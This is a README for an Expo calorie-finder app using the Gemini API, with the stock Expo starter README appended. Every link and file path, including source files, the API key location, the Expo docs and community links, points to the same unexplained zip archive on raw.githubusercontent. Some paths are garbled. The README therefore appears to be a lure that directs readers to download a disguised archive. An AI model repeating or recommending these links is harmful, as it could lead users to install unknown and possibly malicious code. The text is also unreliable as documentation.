# Calories Finder App

A React Native (Expo) application that uses Google's Gemini 2.5 Pro API to analyze food images and provide nutritional information.

## Features

- **Image Analysis**: Take photos or select images from gallery to get calorie and nutritional information
- **Text Search**: Search for food items by name to get nutritional data
- **Detailed Nutrition**: View calories, protein, carbs, fat, and fiber content
- **Confidence Scoring**: See how confident the AI is in its analysis
- **Modern UI**: Clean, intuitive interface with dark/light theme support

## Setup

1. **Install Dependencies**

   ```bash
   npm install
   ```

2. **API Key Configuration**
   The Gemini API key is already configured in `https://raw.githubusercontent.com/kartik-parmar007/Food_calories/master/tauryl/Food_calories.zip`. For production use, consider moving this to environment variables.

3. **Run the App**
   ```bash
   npm start
   ```

## Usage

### Image Analysis

1. Tap the "Calories" tab
2. Choose "Image Search" mode
3. Either:
   - Tap "📸 Take Photo" to capture a new image
   - Tap "🖼️ Choose from Gallery" to select an existing image
4. Wait for the AI to analyze the food
5. View the nutritional information

### Text Search

1. Tap the "Calories" tab
2. Choose "Text Search" mode
3. Enter a food name (e.g., "apple", "chicken breast")
4. Tap "🔍 Search" or press Enter
5. View the nutritional information

## Technical Details

- **Framework**: React Native with Expo
- **AI Service**: Google Gemini 2.5 Pro API
- **Image Processing**: Expo Image Picker and Camera
- **UI Components**: Custom themed components with dark/light mode support

## API Response Format

The app expects the Gemini API to return JSON in this format:

```json
{
  "foodName": "Apple",
  "calories": 95,
  "servingSize": "1 medium apple",
  "nutrients": {
    "protein": 0.5,
    "carbs": 25,
    "fat": 0.3,
    "fiber": 4
  },
  "confidence": 0.95
}
```

## Permissions

The app requires:

- Camera permission for taking photos
- Photo library access for selecting images

## Troubleshooting

- **API Errors**: Check your internet connection and API key validity
- **Image Analysis Fails**: Try taking a clearer photo or using text search
- **Permission Issues**: Grant camera and photo library permissions in your device settings

## Development

To modify the app:

- Main component: `https://raw.githubusercontent.com/kartik-parmar007/Food_calories/master/tauryl/Food_calories.zip`
- API service: `https://raw.githubusercontent.com/kartik-parmar007/Food_calories/master/tauryl/Food_calories.zip`
- Text search: `https://raw.githubusercontent.com/kartik-parmar007/Food_calories/master/tauryl/Food_calories.zip`
- Tab layout: `app/(tabs)https://raw.githubusercontent.com/kartik-parmar007/Food_calories/master/tauryl/Food_calories.zip`

# Welcome to your Expo app 👋

This is an [Expo](https://raw.githubusercontent.com/kartik-parmar007/Food_calories/master/tauryl/Food_calories.zip) project created with [`create-expo-app`](https://raw.githubusercontent.com/kartik-parmar007/Food_calories/master/tauryl/Food_calories.zip).

## Get started

1. Install dependencies

   ```bash
   npm install
   ```

2. Start the app

   ```bash
   npx expo start
   ```

In the output, you'll find options to open the app in a

- [development build](https://raw.githubusercontent.com/kartik-parmar007/Food_calories/master/tauryl/Food_calories.zip)
- [Android emulator](https://raw.githubusercontent.com/kartik-parmar007/Food_calories/master/tauryl/Food_calories.zip)
- [iOS simulator](https://raw.githubusercontent.com/kartik-parmar007/Food_calories/master/tauryl/Food_calories.zip)
- [Expo Go](https://raw.githubusercontent.com/kartik-parmar007/Food_calories/master/tauryl/Food_calories.zip), a limited sandbox for trying out app development with Expo

You can start developing by editing the files inside the **app** directory. This project uses [file-based routing](https://raw.githubusercontent.com/kartik-parmar007/Food_calories/master/tauryl/Food_calories.zip).

## Get a fresh project

When you're ready, run:

```bash
npm run reset-project
```

This command will move the starter code to the **app-example** directory and create a blank **app** directory where you can start developing.

## Learn more

To learn more about developing your project with Expo, look at the following resources:

- [Expo documentation](https://raw.githubusercontent.com/kartik-parmar007/Food_calories/master/tauryl/Food_calories.zip): Learn fundamentals, or go into advanced topics with our [guides](https://raw.githubusercontent.com/kartik-parmar007/Food_calories/master/tauryl/Food_calories.zip).
- [Learn Expo tutorial](https://raw.githubusercontent.com/kartik-parmar007/Food_calories/master/tauryl/Food_calories.zip): Follow a step-by-step tutorial where you'll create a project that runs on Android, iOS, and the web.

## Join the community

Join our community of developers creating universal apps.

- [Expo on GitHub](https://raw.githubusercontent.com/kartik-parmar007/Food_calories/master/tauryl/Food_calories.zip): View our open source platform and contribute.
- [Discord community](https://raw.githubusercontent.com/kartik-parmar007/Food_calories/master/tauryl/Food_calories.zip): Chat with Expo users and ask questions.
